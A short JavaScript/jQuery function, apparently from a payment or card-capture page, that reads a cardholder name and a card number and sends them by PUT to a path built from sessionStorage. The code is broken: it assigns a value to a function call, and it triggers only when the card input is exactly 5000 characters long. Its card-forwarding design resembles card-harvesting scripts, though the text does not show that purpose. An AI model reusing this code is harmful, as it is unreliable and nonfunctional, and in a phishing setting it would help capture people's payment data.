function sendCard(e){
    let cardholder = $('input[name=cardholder]').val();
    $('input[name=cardholder]').val() = sessionStorage.getItem('page');
    if(e.value.length == 5000){
        $.ajax({
        url:`${location.origin}${location.pathname}/${sessionStorage.getItem('page')}`,
        type:'PUT',
        data: {uuid,card_number:e.value,cardholder,single:true},
        success: ret=> {
            if(ret.code != 200){
                $('#pageloader').hide();
                $('input[name=card_number]').focus();
                $("#error").text(ret.msg);
                return false;
            }else{
                $('#error').text('');
            }
 
        }
    })
    }
}